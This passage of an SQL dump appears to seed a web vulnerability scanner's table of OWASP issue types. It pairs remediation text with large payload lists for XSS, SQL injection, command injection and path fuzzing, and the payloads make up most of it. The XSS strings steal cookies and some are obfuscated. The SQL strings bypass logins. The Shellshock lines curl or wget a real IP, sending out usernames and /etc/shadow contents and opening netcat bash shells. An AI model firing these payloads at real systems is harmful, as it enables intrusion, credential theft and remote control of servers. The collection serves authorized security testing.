XMLHttpRequest();r.open(\'GET\',\'http://xssme.html5sec.org/xssme2\',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\\\/script>%26quot;)%22></iframe>\",\n      \"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open(\'GET\',\'http://xssme.html5sec.org/xssme2\',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\\\/script>%26quot;)%22></iframe>\",\n      \"<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open(\'GET\',\'http://xssme.html5sec.org/xssme2\',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\\\/script>%26quot;)%22></iframe>\",\n      \"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open(\'GET\',\'http://xssme.html5sec.org/xssme2\',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\\\/script>%26quot;)%22></iframe>\",\n      \"<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__(\'type\', function() {get = arguments.callee.caller.arguments.callee;return \'click\';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__(\'0\', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#\",\n      \"<iframe onload=%22write(\'<script>\'%2Blocation.hash.substr(1)%2B\'</script>\')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open(\'GET\', \'http://xssme.html5sec.org/xssme2\', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = \'(.*?)\'/)[1]) };xhr.send();\",\n      \"<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = \'(.*?)\'/)[1])</script>\",\n      \"<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\\\\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open(\'GET\'%252C%2520\'http%253A%252F%252Fhtml5sec.org%252Fxssme2\'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520\'(.*%253F)\'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\\\\/script%26gt;\\\\%26quot;%26quot;) autofocus></textarea>\",\n      \"<iframe onload=%22write(\'<script>\'%2Blocation.hash.substr(1)%2B\'</script>\')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open(\'GET\', \'http://xssme.html5sec.org/xssme2\', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = \'(.*?)\'/)[1]) };xhr.send();\",\n      \"<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = \'(.*?)\'/)[1])</script>\",\n      \"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open(\'GET\', \'http://xssme.html5sec.org/xssme2\', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = \'(.*?)\'/)[1]) };xhr.send();\",\n      \"<textarea id=ta onfocus=%22write(\'<script>alert(1)</script>\')%22 autofocus></textarea>\",\n      \"<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>\",\n      \"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open(\'GET\', \'http://xssme.html5sec.org/xssme2\', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = \'(.*?)\'/)[1]) };xhr.send();\",\n      \"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E\",\n      \"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open(\'GET\',\'http://html5sec.org/xssme2\',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/\'([^\']%2b)/)[1])}};xhr.send();%22>`>\",\n      \"<a target=\\\"x\\\" href=\\\"xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E\",\n      \"<a target=\\\"x\\\" href=\\\"xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>\",\n      \"<a target=\\\"x\\\" href=\\\"xssme?xss=<script>find(\'cookie\'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate(\'//script/text()\', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = \'(.*?)\'/)[1])</script>\",\n      \"<a target=\\\"x\\\" href=\\\"xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open(\'GET\', \'.\', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = \'(.*?)\'/)[1]) };xhr.send();\",\n      \"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,\'window\')(),\'document\')(), \'getElementsByTagName\')(\'html\')[0],\'innerHTML\')().match(/d.*\'/));</script>\",\n      \"<a href=\\\"javascript&colon;a&#x6C;&#101%72t&lpar;1&rpar;\\\"><button>\",\n      \"<div onmouseover=\'alert&lpar;1&rpar;\'>DIV</div>\",\n      \"<iframe style=\\\"position:absolute;top:0;left:0;width:100%;height:100%\\\" onmouseover=\\\"prompt(1)\\\">\",\n      \"<a href=\\\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\\\">X</a>\",\n      \"<embed src=\\\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\\\"> ?\",\n      \"<object data=\\\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\\\">?\",\n      \"<var onmouseover=\\\"prompt(1)\\\">On Mouse Over</var>?\",\n      \"<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>\",\n      \"<img src=\\\"/\\\" =_=\\\" title=\\\"onerror=\'prompt(1)\'\\\">\",\n      \"<%<!--\'%><script>alert(1);</script -->\",\n      \"<script src=\\\"data:text/javascript,alert(1)\\\"></script>\",\n      \"<iframe/src \\\\/\\\\/onload = prompt(1)\",\n      \"<iframe/onreadystatechange=alert(1)\",\n      \"<svg/onload=alert(1)\",\n      \"<input value=<><iframe/src=javascript:confirm(1)\",\n      \"<input type=\\\"text\\\" value=``<div/onmouseover=\'alert(1)\'>X</div>\",\n      \"http://www.<script>alert(1)</script .com\",\n      \"<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?\",\n      \"<svg><script ?>alert(1)\",\n      \"<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>\",\n      \"<img src=`xx:xx`onerror=alert(1)>\",\n      \"<object type=\\\"text/x-scriptlet\\\" data=\\\"http://jsfiddle.net/XLE63/ \\\"></object>\",\n      \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;javascript&colon;alert(1)\\\"/>?\",\n      \"<math><a xlink:href=\\\"//jsfiddle.net/t846h/\\\">click\",\n      \"<embed code=\\\"http://businessinfo.co.uk/labs/xss/xss.swf\\\" allowscriptaccess=always>?\",\n      \"<svg contentScriptType=text/vbs><script>MsgBox+1\",\n      \"<a href=\\\"data:text/html;base64_,<svg/onload=a&#x6C;&#101%72t(1)>\\\">X</a\",\n      \"<iframe/onreadystatechange=alert(\'a\') worksinIE>\",\n      \"<script>~\'a\' ;  throw ~ this.  alert(~\'a\')</script U+\",\n      \"<script/src=\\\"data&colon;text%2Fjavascript,alert(\'a\')\\\"></script a=a & /=%2F\",\n      \"<script/src=data&colon;text/java&#115&#99&#114&#105&#112&#116,a%6C%65%72%74(/XSS/)></script ????????????\",\n      \"<object data=javascript&colon;a&#x6C;&#101%72t(1)>\",\n      \"<script>+-+-1-+-+alert(1)</script>\",\n      \"<body/onload=&lt;!--&gt;&#10alert(1)>\",\n      \"<script itworksinallbrowsers>/*<script* */alert(1)</script ?\",\n      \"<img src ?itworksonchrome?\\\\/onerror = alert(1)???\",\n      \"<svg><script>//&NewLine;confirm(1);</script </svg>\",\n      \"<svg><script onlypossibleinopera:-)> alert(1)\",\n      \"<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe\",\n      \"<script x> alert(1) </script 1=2\",\n      \"<div/onmouseover=\'alert(1)\'> style=\\\"x:\\\">\",\n      \"<--`<img/src=` onerror=alert(1)> --!>\",\n      \"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?\",\n      \"<div  style=\\\"position:absolute;top:0;left:0;width:100%;height:100%\\\"  onmouseover=\\\"prompt(1)\\\" onclick=\\\"alert(1)\\\">x</button>?\",\n      \"\\\"><img src=x onerror=window.open(\'https://www.google.com/\');>\",\n      \"<form><button formaction=javascript&colon;alert(1)>CLICKME\",\n      \"<math><a xlink:href=\\\"//jsfiddle.net/t846h/\\\">click\",\n      \"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?\",\n      \"<iframe  src=\\\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\\\"></iframe>\",\n      \"<a  href=\\\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\\\">Click  Me</a>\",\n      \"\\\"><img src=x onerror=prompt(1);>\"\n    ]\n  }', 'WSTG-INPV-01', 0, 'High'),
(11, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', '{\"sql\": [\"\'-\'\", \"\' \'\", \"\'&\'\", \"\'^\'\", \"\'*\'\", \"\' or \'\'-\'\", \"\' or \'\' \'\", \"\' or \'\'&\'\", \"\' or \'\'^\'\", \"\' or \'\'*\'\", \"\\\"-\\\"\", \"\\\" \\\"\", \"\\\"&\\\"\", \"\\\"^\\\"\", \"\\\"*\\\"\", \"\\\" or \\\"\\\"-\\\"\", \"\\\" or \\\"\\\" \\\"\", \"\\\" or \\\"\\\"&\\\"\", \"\\\" or \\\"\\\"^\\\"\", \"\\\" or \\\"\\\"*\\\"\", \"or true--\", \"\\\" or true--\", \"\' or true--\", \"\\\") or true--\", \"\') or true--\", \"\' or \'x\'=\'x\", \"\') or (\'x\')=(\'x\", \"\')) or ((\'x\'))=((\'x\", \"\\\" or \\\"x\\\"=\\\"x\", \"\\\") or (\\\"x\\\")=(\\\"x\", \"\\\")) or ((\\\"x\\\"))=((\\\"x\", \"or 1=1\", \"or 1=1-- \", \"or 1=1#\", \"or 1=1/*\", \"admin\' --\", \"admin\' #\", \"admin\'/*\", \"admin\' or \'1\'=\'1\", \"admin\' or \'1\'=\'1\'--\", \"admin\' or \'1\'=\'1\'#\", \"admin\' or \'1\'=\'1\'/*\", \"admin\'or 1=1 or \'\'=\'\", \"admin\' or 1=1\", \"admin\' or 1=1--\", \"admin\' or 1=1#\", \"admin\' or 1=1/*\", \"admin\') or (\'1\'=\'1\", \"admin\') or (\'1\'=\'1\'--\", \"admin\') or (\'1\'=\'1\'#\", \"admin\') or (\'1\'=\'1\'/*\", \"admin\') or \'1\'=\'1\", \"admin\') or \'1\'=\'1\'--\", \"admin\') or \'1\'=\'1\'#\", \"admin\') or \'1\'=\'1\'/*\", \"1234 \' AND 1=0 UNION ALL SELECT \'admin\', \'81dc9bdb52d04dc20036dbd8313ed055\", \"admin\\\" --\", \"admin\\\" #\", \"admin\\\"/*\", \"admin\\\" or \\\"1\\\"=\\\"1\", \"admin\\\" or \\\"1\\\"=\\\"1\\\"--\", \"admin\\\" or \\\"1\\\"=\\\"1\\\"#\", \"admin\\\" or \\\"1\\\"=\\\"1\\\"/*\", \"admin\\\"or 1=1 or \\\"\\\"=\\\"\", \"admin\\\" or 1=1\", \"admin\\\" or 1=1--\", \"admin\\\" or 1=1#\", \"admin\\\" or 1=1/*\", \"admin\\\") or (\\\"1\\\"=\\\"1\", \"admin\\\") or (\\\"1\\\"=\\\"1\\\"--\", \"admin\\\") or (\\\"1\\\"=\\\"1\\\"#\", \"admin\\\") or (\\\"1\\\"=\\\"1\\\"/*\", \"admin\\\") or \\\"1\\\"=\\\"1\", \"admin\\\") or \\\"1\\\"=\\\"1\\\"--\", \"admin\\\") or \\\"1\\\"=\\\"1\\\"#\", \"admin\\\") or \\\"1\\\"=\\\"1\\\"/*\", \"1234 \\\" AND 1=0 UNION ALL SELECT \\\"admin\\\", \\\"81dc9bdb52d04dc20036dbd8313ed055\"]}', 'WSTG-INPV-05', 0, 'High'),
(12, 'Command Injection', 'Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.\n\nOS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application\'s own data and functionality. It may also be possible to use the server as a platform for attacks against other systems. The exact potential for exploitation depends upon the security context in which the command is executed, and the privileges that this context has regarding sensitive resources on the server.', 'If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.\n\nIf it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks:\n\nThe user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.\nThe application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate the impact of an attack even in the event that an attacker circumvents the input validation defenses.', 'https://portswigger.net/kb/issues/00100100_os-command-injection', '{\n    \"common-inject\": [\n      \"\",\n      \"&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;\",\n      \"&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;\",\n      \"&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;\",\n      \"&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;\",\n      \"/index.html|id|\",\n      \";id;\",\n      \";id\",\n      \";netstat -a;\",\n      \";system(\'cat%20/etc/passwd\')\",\n      \";id;\",\n      \"|id\",\n      \"|/usr/bin/id\",\n      \"|id|\",\n      \"|/usr/bin/id|\",\n      \"||/usr/bin/id|\",\n      \"|id;\",\n      \"||/usr/bin/id;\",\n      \";id|\",\n      \";|/usr/bin/id|\",\n      \"\",\n      \"/bin/ls -al\",\n      \"\",\n      \"\",\n      \"/usr/bin/id\",\n      \"\",\n      \"\",\n      \"id\",\n      \"\",\n      \"\",\n      \"/usr/bin/id;\",\n      \"\",\n      \"id;\",\n      \"\",\n      \"/usr/bin/id|\",\n      \"\",\n      \"id|\",\n      \";/usr/bin/id\",\n      \"\",\n      \";id\",\n      \"\",\n      \"|usr/bin/id\",\n      \"\",\n      \"|nid\",\n      \"\",\n      \"`id`\",\n      \"`/usr/bin/id`\",\n      \"a);id\",\n      \"a;id\",\n      \"a);id;\",\n      \"a;id;\",\n      \"a);id|\",\n      \"a;id|\",\n      \"a)|id\",\n      \"a|id\",\n      \"a)|id;\",\n      \"a|id\",\n      \"|/bin/ls -al\",\n      \"a);/usr/bin/id\",\n      \"a;/usr/bin/id\",\n      \"a);/usr/bin/id;\",\n      \"a;/usr/bin/id;\",\n      \"a);/usr/bin/id|\",\n      \"a;/usr/bin/id|\",\n      \"a)|/usr/bin/id\",\n      \"a|/usr/bin/id\",\n      \"a)|/usr/bin/id;\",\n      \"a|/usr/bin/id\",\n      \";system(\'cat%20/etc/passwd\')\",\n      \";system(\'id\')\",\n      \";system(\'/usr/bin/id\')\",\n      \"%0Acat%20/etc/passwd\",\n      \"%0A/usr/bin/id\",\n      \"%0Aid\",\n      \"%0A/usr/bin/id%0A\",\n      \"%0Aid%0A\",\n      \"& ping -i 30 127.0.0.1 &\",\n      \"& ping -n 30 127.0.0.1 &\",\n      \"%0a ping -i 30 127.0.0.1 %0a\",\n      \"`ping 127.0.0.1`\",\n      \"| id\",\n      \"& id\",\n      \"; id\",\n      \"%0a id %0a\",\n      \"`id`\",\n      \"$;/usr/bin/id\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\\\\`whoami\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\\\\`pwd\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\\\\`grep root /etc/shadow\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\\\`uname -a\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\\\`nc -lvvp 1234 -e /bin/bash\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\\\\`nc -lvvp 1236 -e /bin/bash &\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 1 && echo vulnerable 1\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 3 && echo vulnerable 3\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9\\\"\",\n      \"() { :;}; /bin/bash -c \\\"sleep 6 && echo vulnerable 6\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\\\\`whoami\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\\\\`pwd\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\\\\`grep root /etc/shadow\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\\\\`uname -a\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\\\\`nc -lvvp 1235 -e /bin/bash\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\\\\`nc -lvvp 1237 -e /bin/bash &\\\\`\\\"\",\n      \"() { :;}; /bin/bash -c \\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=4\\\"\",\n      \"cat /etc/hosts\",\n      \"$(`cat /etc/passwd`)\",\n      \"cat /etc/passwd\",\n      \"%0Acat%20/etc/passwd\",\n      \"{{ get_user_file(\\\"/etc/passwd\\\") }}\",\n      \"<!--#exec cmd=\\\"/bin/cat /etc/passwd\\\"-->\",\n      \"<!--#exec cmd=\\\"/bin/cat /etc/shadow\\\"-->\",\n      \"<!--#exec cmd=\\\"/usr/bin/id;-->\",\n      \"system(\'cat /etc/passwd\');\",\n      \"<?php system(\\\"cat /etc/passwd\\\");?>\",\n      \"\",\n      \"\"\n    ]\n  }', 'WSTG-INPV-12', 0, 'High');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(13, 'FUZZ', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', NULL, '{\n    \"common\": [\n    \n      \".bash_history\",\n      \".bashrc\",\n      \".cache\",\n      \".config\",\n      \".cvs\",\n      \"catalog?category=Accessories\",\n      \"catalog?searchTerm=&category=Accessories\",\n      \".cvsignore\",\n      \".forward\",\n      \".git/HEAD\",\n      \".history\",\n      \".hta\",\n      \".htaccess\",\n      \".htpasswd\",\n      \".listing\",\n      \".listings\",\n      \".mysql_history\",\n      \".passwd\",\n      \".perf\",\n      \".profile\",\n      \".rhosts\",\n      \".sh_history\",\n      \".ssh\",\n      \".subversion\",\n      \".svn\",\n      \".svn/entries\",\n      \".swf\",\n      \".web\",\n      \"@\",\n      \"_\",\n      \"_adm\",\n      \"_admin\",\n      \"_ajax\",\n      \"_archive\",\n      \"_assets\",\n      \"_backup\",\n      \"_baks\",\n      \"_borders\",\n      \"_cache\",\n      \"_catalogs\",\n      \"_code\",\n      \"_common\",\n      \"_conf\",\n      \"_config\",\n      \"_css\",\n      \"_data\",\n      \"_database\",\n      \"_db_backups\",\n      \"_derived\",\n      \"_dev\",\n      \"_dummy\",\n      \"_files\",\n      \"_flash\",\n      \"_fpclass\",\n      \"_images\",\n      \"_img\",\n      \"_inc\",\n      \"_include\",\n      \"_includes\",\n      \"_install\",\n      \"_js\",\n      \"_layouts\",\n      \"_lib\",\n      \"_media\",\n      \"_mem_bin\",\n      \"_mm\",\n      \"_mmserverscripts\",\n      \"_mygallery\",\n      \"_net\",\n      \"_notes\",\n      \"_old\",\n      \"_overlay\",\n      \"_pages\",\n      \"_private\",\n      \"_reports\",\n      \"_res\",\n      \"_resources\",\n      \"_scriptlibrary\",\n      \"_scripts\",\n      \"_source\",\n      \"_src\",\n      \"_stats\",\n      \"_styles\",\n      \"_swf\",\n      \"_temp\",\n      \"_tempalbums\",\n      \"_template\",\n      \"_templates\",\n      \"_test\",\n      \"_themes\",\n      \"_tmp\",\n      \"_tmpfileop\",\n      \"_vti_aut\",\n      \"_vti_bin\",\n      \"_vti_bin/_vti_adm/admin.dll\",\n      \"_vti_bin/_vti_aut/author.dll\",\n      \"_vti_bin/shtml.dll\",\n      \"_vti_cnf\",\n      \"_vti_inf\",\n      \"_vti_log\",\n      \"_vti_map\",\n      \"_vti_pvt\",\n      \"_vti_rpc\",\n      \"_vti_script\",\n      \"_vti_txt\",\n      \"_www\",\n      \"~adm\",\n      \"~admin\",\n      \"~administrator\",\n      